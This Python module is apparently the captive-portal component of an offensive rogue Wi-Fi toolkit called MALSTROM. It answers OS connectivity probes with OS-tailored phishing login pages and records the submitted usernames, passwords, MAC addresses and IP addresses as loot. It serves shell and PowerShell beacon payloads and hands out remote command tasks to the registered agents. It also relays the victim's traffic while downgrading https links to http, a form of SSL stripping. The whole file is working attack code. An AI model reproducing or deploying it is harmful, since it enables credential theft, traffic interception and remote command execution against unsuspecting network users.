"""Victim captive portal.

A pure-Python replacement for the old nginx+php-fpm stack. Replies to the OS
captive-portal probes (/generate_204, /connecttest.txt, /hotspot-detect.html),
serves OS-adaptive phishing templates from portal/templates, and captures
POSTed credentials into the state dir + loot. Whitelists the submitting client
so the monitor can pass it through.
"""

import html
import errno
import hashlib
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from . import clone
from . import config
from . import linuxutil
from . import monitor
from . import relay
from . import state

CREDS_BODY_CAP = 64 * 1024          # phishing form submission
BEACON_BODY_CAP = 512 * 1024        # beacon agent task output

SUCCESS_PAGE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connected</title><style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;background:#0c1118;color:#e7ebf2;min-height:100vh;display:flex;align-items:center;justify-content:center}}
.card{{text-align:center;max-width:400px;padding:30px}}
.spin{{width:56px;height:56px;margin:0 auto 24px;border:4px solid rgba(63,140,255,.2);border-top-color:#3f8cff;border-radius:50%;animation:s 1s linear infinite}}
@keyframes s{{to{{transform:rotate(360deg)}}}}
h1{{font-size:20px;margin-bottom:8px}}
p{{color:#94a3b8;font-size:14px;min-height:20px}}
.bar{{height:5px;background:#1c2431;border-radius:4px;margin-top:22px;overflow:hidden}}
.fill{{height:100%;width:0;background:#3f8cff;border-radius:4px;transition:width .3s}}
</style></head><body>
<div class="card"><div class="spin"></div><h1>Connected</h1><p id="s">Securing your connection…</p><div class="bar"><div class="fill" id="f"></div></div></div>
<script>
var t=__TARGET__,star=Date.now(),f=document.getElementById("f"),s=document.getElementById("s"),
 msgs=["Verifying credentials…","Configuring network…","Establishing secure session…","Finalizing connection…"];
setInterval(function(){{var e=Date.now()-star;f.style.width=Math.min(95,100*(1-Math.exp(-e/30000)))+"%";s.textContent=msgs[Math.floor(e/6000)%msgs.length];}},200);
function go(){{var im=new Image();im.onload=function(){{f.style.width="100%";setTimeout(function(){{location.href=__TARGET__;}},400);}};im.onerror=function(){{setTimeout(go,2000);}};im.src="http://www.example.com/favicon.ico?"+Date.now();}}
setTimeout(go,1200);
</script></body></html>"""


def _success_page():
    target = json.dumps(config.REDIRECT_TARGET)
    return SUCCESS_PAGE.replace('__TARGET__', target)


def detect_os(ua):
    ua = ua or ''
    low = ua.lower()
    if 'windows' in low:
        return 'windows'
    if 'mac os' in low or 'macos' in low:
        return 'mac'
    if 'android' in low:
        return 'android'
    if 'iphone' in low or 'ipad' in low or 'ipod' in low or 'crios' in low:
        return 'ios'
    return ''


def _victim_token(ip):
    """Short, deterministic per-client token (correlates cred capture +
    page renders to one victim without storing anything about them)."""
    return hashlib.md5(('malstrom-victim:' + str(ip)).encode()).hexdigest()[:10]


class PortalHandler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    server_version = 'MALSTROM-PORTAL'
    timeout = 10  # close idle keep-alive sockets so threads don't pile up

    def log_message(self, *args):
        pass

    @property
    def _engine(self):
        return getattr(self.server, 'engine', None)

    def _rogue_client(self):
        ip = self.client_address[0]
        prefix = '.'.join(str(config.PORTAL_NET).split('.')[:3]) + '.'
        return str(ip).startswith(prefix)

    def _read_body(self, cap):
        """Bounded body read with keep-alive safety.

        Returns (True, body) on a clean, in-range Content-Length body;
        (None, b'') when the framing can't be trusted (chunked, missing,
        malformed or oversized Content-Length) — the caller should answer
        and the connection is flagged for close so unread bytes can't smear
        into the next keep-alive request (desync/smuggling).
        """
        header = self.headers.get('Content-Length')
        if header is None:
            self.close_connection = True
            return None, b''
        header = header.strip()
        if not header.isdigit():
            self.close_connection = True
            return None, b''
        length = int(header)
        if length <= 0:
            return True, b''
        if length > cap:
            self.close_connection = True
            return None, b''
        return True, self.rfile.read(length)

    # --- beacon agent routes -------------------------------------------------------
    def _beacon_route(self):
        eng = self._engine
        if not eng or not eng.enabled() or not self._rogue_client():
            return False
        path = urllib.parse.urlparse(self.path).path
        if path in ('/beacon', '/beacon/sh'):
            return self._serve(200, 'text/plain; charset=utf-8', eng.payload('sh'))
        if path in ('/beacon.ps1', '/beacon/ps1'):
            return self._serve(200, 'text/plain; charset=utf-8', eng.payload('ps1'))
        return False

    def _beacon_route_post(self):
        eng = self._engine
        if not eng or not eng.enabled() or not self._rogue_client():
            return False
        path = urllib.parse.urlparse(self.path).path
        if path not in ('/beacon/reg', '/beacon/out'):
            return False
        ok, raw = self._read_body(BEACON_BODY_CAP)
        if ok is None:
            return self._serve(413, 'text/plain', 'payload too large')
        raw = raw.decode('utf-8', 'replace')
        params = urllib.parse.parse_qs(raw, keep_blank_values=True)
        get = lambda k: (params.get(k, [''])[0]).strip()
        if path == '/beacon/reg':
            out = eng.register(self.client_address[0], get('host'),
                               get('os'), get('user'), get('k'))
            if out is None:
                return self._serve(403, 'text/plain', 'denied')
            sid, tasks = out
            lines = ['SID=%s' % sid]
            for t in tasks:
                lines.append('TASK|%s|%s' % (t['id'], t['cmd']))
                eng.mark_sent(sid, t['id'])
            return self._serve(200, 'text/plain; charset=utf-8', '\n'.join(lines))
        if path == '/beacon/out':
            eng.task_output(get('sid'), get('id'), get('out'))
            return self._serve(200, 'text/plain', 'OK')
        return False

    def _current_ssid(self):
        st = state.load_state()
        portal = (st.get('portal_ssid') or '').strip()
        if portal:
            return portal
        return state.get_current_ssid() or st.get('target_ssid', '') or 'MALSTROM-NET'

    def _template_name(self):
        default = state.get_template_default() or 'wifi_login'
        if default != 'auto':
            for base in (config.CUSTOM_TEMPLATES_DIR, config.TEMPLATES_DIR):
                if os.path.exists(os.path.join(base, default + '.html')):
                    return default
        osn = detect_os(self.headers.get('User-Agent', ''))
        for base in (config.CUSTOM_TEMPLATES_DIR, config.TEMPLATES_DIR):
            if os.path.exists(os.path.join(base, osn + '.html')):
                return osn
        return 'wifi_login'

    def _render(self):
        name = self._template_name()
        path = None
        for base in (config.CUSTOM_TEMPLATES_DIR, config.TEMPLATES_DIR):
            candidate = os.path.join(base, name + '.html')
            if os.path.exists(candidate):
                path = candidate
                break
        if not path:
            candidate = os.path.join(config.CUSTOM_TEMPLATES_DIR, 'wifi_login.html')
            if os.path.exists(candidate):
                path = candidate
            else:
                path = os.path.join(config.TEMPLATES_DIR, 'wifi_login.html')
        try:
            with open(path, encoding='utf-8') as fh:
                body = fh.read()
        except (IOError, OSError):
            body = ("<html><body style='font-family:sans-serif;background:#111;color:#eee;"
                    "padding:40px'><h2>Welcome to %s</h2><p>Please sign in to continue."
                    "</p></body></html>" % html.escape(self._current_ssid()))
        ssid = html.escape(self._current_ssid(), quote=True)
        target = html.escape(config.REDIRECT_TARGET, quote=True)
        body = body.replace('__MALSTROM_SSID__', ssid).replace(
            '__MALSTROM_TARGET__', target)
        token = _victim_token(self.client_address[0])
        if '__MALSTROM_TOKEN__' in body:
            body = body.replace('__MALSTROM_TOKEN__',
                                html.escape(token, quote=True))
        if '<form' in body.lower():
            hidden = ('<input type="hidden" name="mvt" value="%s">'
                      % html.escape(token, quote=True))
            body = re.sub(
                r'(?i)<form\b[^>]*>',
                lambda m: m.group(0) + hidden, body)
        return body

    def _probe(self):
        path = urllib.parse.urlparse(self.path).path
        if path in ('/generate_204', '/gen_204', '/hotspot-detect.html',
                    '/library/test/success.html', '/success.txt',
                    '/connecttest.txt', '/ncsi.txt', '/redirect'):
            return self._serve(200, 'text/html; charset=utf-8', self._render())
        if path in ('/portal-api', '/portal.json'):
            body = json.dumps({'captive': True,
                               'user-portal-url': 'http://%s/' % config.PORTAL_IP,
                               'can-extend-session': False,
                               'session-timeout': 0})
            return self._serve(200, 'application/json', body)
        return False

    def _serve(self, code, ctype, body):
        data = body.encode('utf-8') if isinstance(body, str) else body
        self.send_response(code)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        try:
            self.wfile.write(data)
        except OSError:
            pass
        return True

    def _clone_asset(self):
        """Serve one proxied cloned-page asset (/__clone/<netloc>/<path>)."""
        ref = urllib.parse.urlparse(self.path)
        if not (ref.path.startswith('/%s/' % clone.GATEWAY)
                and len(ref.path) > len('/%s/' % clone.GATEWAY)):
            return False
        uri = ref.path + (('?' + ref.query) if ref.query else '')
        try:
            data, ctype = clone.fetch_gateway_asset(uri)
        except (IOError, OSError, ValueError):
            data, ctype = None, ''
        if data is None:
            return self._serve(404, 'text/plain', 'asset unavailable')
        self.send_response(200)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(data)))
        self.send_header('Cache-Control', 'public, max-age=3600')
        self.end_headers()
        try:
            self.wfile.write(data)
        except OSError:
            pass
        return True

    def do_GET(self):
        try:
            if self._probe():
                return
            if self._beacon_route():
                return
            if self._clone_asset():
                return
            if self._relay_route('GET', None):
                return
            qs = urllib.parse.urlparse(self.path).query
            if qs:
                params = urllib.parse.parse_qs(qs, keep_blank_values=True)
                username, password = self._extract_creds(params)
                if self._record_creds(username, password, params) is not None:
                    return
            self._serve(200, 'text/html; charset=utf-8', self._render())
        except Exception:
            self._serve(500, 'text/plain', 'internal error')

    def do_POST(self):
        try:
            if self._beacon_route_post():
                return
            ok, raw = self._read_body(CREDS_BODY_CAP)
            if ok is None:
                self._serve(413, 'text/plain', 'payload too large')
                return
            if self._relay_route('POST', raw):
                return
            raw = raw.decode('utf-8', 'replace')
            params = urllib.parse.parse_qs(raw, keep_blank_values=True)
            username, password = self._extract_creds(params)
            if self._record_creds(username, password, params) is not None:
                return
            self._serve(200, 'text/html; charset=utf-8', _success_page())
        except Exception:
            self._serve(500, 'text/plain', 'internal error')

    def _relay_route(self, method, body):
        """SSL-strip-lite: transparently relay victim cleartext HTTP upstream.

        Only fires when relay mode is armed AND the request targets a real
        external host (never the rogue portal itself, its asset gateway, or
        the captive-probe endpoints). HTML responses have their https://
        references downgraded to http:// so the victim never attempts TLS.
        """
        if not state.load_state().get('relay', config.RELAY):
            return False
        host = (self.headers.get('Host') or '').strip()
        url = relay.parse_target(method, self.path, host)
        if not url:
            return False
        headers = dict(self.headers.items())
        try:
            status, ctype, data = relay.forward(method, url, headers, body)
        except (IOError, OSError, ValueError):
            return self._serve(502, 'text/plain', 'relay: upstream unreachable')
        if ctype.lower().startswith('text/html'):
            data = relay.rewrite_https_to_http(data)
        relay.log_pair(self.client_address[0], method, url, status,
                       len(data), 'sslstrip')
        self.send_response(status)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        try:
            self.wfile.write(data)
        except OSError:
            pass
        return True

    def _extract_creds(self, params):
        get = lambda k: (params.get(k, [''])[0]).strip()
        username = ''
        for k in ('login', 'username', 'email', 'uid', 'user'):
            v = get(k)
            if v:
                username = v
                break
        password = ''
        for k in ('password', 'pass', 'pwd', 'passwd', 'key', 'wifi_pass'):
            v = get(k)
            if v:
                password = v
                break
        return username, password

    def _record_creds(self, username, password, params):
        get = lambda k: (params.get(k, [''])[0]).strip()
        client_ip = self.client_address[0]
        mac = monitor.read_arp_table().get(client_ip, {}).get('mac', '')
        token = get('mvt') or _victim_token(client_ip)
        entry = {
            'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
            'template': self._template_name(),
            'device': detect_os(self.headers.get('User-Agent', '')),
            'username': username,
            'password': password,
            'hostname': get('hostname'),
            'mac': mac,
            'ip': client_ip,
            'token': token,
            'ua': self.headers.get('User-Agent', ''),
        }
        if not (username or password):
            return None
        state.append_cred(entry)
        if state.load_state().get('shield_after_capture', True):
            state.add_whitelist(client_ip)
        state.upsert_device(mac, ip=client_ip,
                            hostname=entry.get('hostname', ''),
                            os_=entry.get('device', ''),
                            ua=entry.get('ua', ''), cred=True)
        state.emit('CRED', '%s:%s (%s %s from %s)' % (
            username or '', password or '', entry['device'],
            entry['hostname'] or '', client_ip))
        state.mirror_loot()
        return self._serve(200, 'text/html; charset=utf-8', _success_page())


def ensure_portal_cert():
    """(cert, key) paths for the TLS portal, generating them once via openssl.

    Returns (None, None) when a cert already exists unreadable or openssl is
    unavailable — the caller then keeps 443 on the plain portal.
    """
    cert = os.path.join(config.STATE_DIR, 'portal-cert.pem')
    key = os.path.join(config.STATE_DIR, 'portal-key.pem')
    if os.path.isfile(cert) and os.path.isfile(key):
        return cert, key
    if not linuxutil.have('openssl'):
        return None, None
    r = linuxutil.run(
        ['openssl', 'req', '-x509', '-newkey', 'rsa:2048', '-sha256',
         '-days', '3650', '-nodes', '-subj', '/CN=malstrom-portal',
         '-addext', 'subjectAltName=DNS:malstrom-portal,DNS:localhost,'
                    'IP:%s' % config.PORTAL_IP,
         '-keyout', key, '-out', cert], timeout=30)
    if r.returncode != 0 or not (os.path.isfile(cert) and os.path.isfile(key)):
        return None, None
    return cert, key


_tls_srv = None
_tls_engine = None


def tls_ready():
    """True once the ssl-wrapped victim portal is actually serving."""
    return _tls_srv is not None


def _tls_loop():
    """Serve the same portal over TLS, retrying until the portal IP exists."""
    global _tls_srv
    cert, key = ensure_portal_cert()
    if not cert:
        state.emit('INFO', 'TLS portal off — self-signed cert could not be '
                           'generated (openssl missing?)')
        return
    while True:
        try:
            srv = PortalTLS(cert, key)
            break
        except OSError as exc:
            if getattr(exc, 'errno', None) == errno.EADDRNOTAVAIL:
                pass            # normal pre-arm: 172.16.52.1 not up yet
            else:
                state.emit('INFO', 'TLS portal retrying: %s' % exc)
            time.sleep(5)
    srv.engine = _tls_engine
    _tls_srv = srv
    state.emit('INFO', 'TLS victim portal on %s:%d (self-signed cert)' % (
        config.PORTAL_IP, config.PORTAL_TLS_PORT))
    try:
        srv.serve_forever()
    except Exception as exc:
        state.emit('ALERT', 'TLS portal crashed: %s' % exc)
    finally:
        _tls_srv = None
        try:
            srv.server_close()
        except Exception:
            pass


class Portal(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True
    engine = None

    def __init__(self):
        # Bind ONLY on the rogue-subnet portal address, never 0.0.0.0. The IP
        # does not exist until the AP stack arms, so an OSError here is normal
        # and lets start()'s loop retry until the interface is live. Listening
        # on all interfaces at boot (the old fallback) exposed the phishing
        # page on the operator's own LAN before anything was armed.
        host = config.PORTAL_IP
        tried = []
        orig_port = config.PORTAL_PORT
        last = None
        for port in (orig_port, 88):
            try:
                super().__init__((host, port), PortalHandler)
                if port != orig_port:
                    # keep DNAT/success-page logic pointing at the live port
                    config.PORTAL_PORT = port
                    state.emit('INFO', 'portal :%d busy — serving portal on :%d'
                               % (orig_port, port))
                return
            except OSError as exc:
                last = exc
                tried.append('%d (%s)' % (port, exc))
                continue
        # Preserve errno so the _run loop can tell EADDRNOTAVAIL (portal IP
        # not up yet — normal pre-arm) from EADDRINUSE (port taken).
        raise OSError(getattr(last, 'errno', None) or errno.EADDRNOTAVAIL,
                      'cannot bind portal on %s: %s' % (host, '; '.join(tried)))

    def serve_forever(self, poll_interval=0.5):
        super().serve_forever(poll_interval)

    def handle_error(self, request, client_address):
        """Victim browsers/OS probes drop connections constantly. Don't spam
        the journal with full tracebacks for what is a normal reset."""
        exc = sys.exc_info()[1]
        if isinstance(exc, (ConnectionResetError, BrokenPipeError,
                            TimeoutError, socket.timeout,
                            ValueError, OSError)):
            return
        super().handle_error(request, client_address)


class PortalTLS(ThreadingHTTPServer):
    """SSL-wrapped portal listener: 443 (DNAT) lands here for https-first
    captive probes, which a plaintext redirect can never satisfy."""
    daemon_threads = True
    allow_reuse_address = True
    engine = None

    def __init__(self, cert, key):
        # Bind ONLY on the rogue-subnet portal address (same rule as Portal).
        super().__init__((config.PORTAL_IP, config.PORTAL_TLS_PORT),
                         PortalHandler)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert, key)
        self.socket = ctx.wrap_socket(self.socket, server_side=True)

    def handle_error(self, request, client_address):
        exc = sys.exc_info()[1]
        if isinstance(exc, (ssl.SSLError, ConnectionResetError,
                            BrokenPipeError, TimeoutError, socket.timeout,
                            ValueError, OSError)):
            return
        super().handle_error(request, client_address)


def start(engine=None):
    state.ensure()

    global _tls_engine
    _tls_engine = engine
    if config.PORTAL_TLS:
        threading.Thread(target=_tls_loop, daemon=True).start()

    def _run():
        while True:
            try:
                server = Portal()
            except OSError as exc:
                if getattr(exc, 'errno', None) == errno.EADDRNOTAVAIL:
                    # normal before arming — the portal IP isn't assigned yet
                    state.emit('INFO', 'portal waiting for %s to come up '
                                       '(binds when the AP arms)' % config.PORTAL_IP)
                else:
                    state.emit('ALERT', 'portal bind failed (ports 80/88 busy) '
                                       '— %s (retrying in 5s)' % exc)
                time.sleep(5)
                continue
            server.engine = engine
            state.emit('INFO', 'victim portal listening on :%d'
                       % config.PORTAL_PORT)
            try:
                server.serve_forever()
            except Exception as exc:
                # never let a crash kill the portal silently — the operator
                # would just see "can't reach the portal" with no reason.
                state.emit('ALERT', 'portal server crashed — restarting: %s'
                           % exc)
            finally:
                try:
                    server.server_close()
                except Exception:
                    pass
            time.sleep(2)

    thread = threading.Thread(target=_run, daemon=True)
    thread.start()
    return thread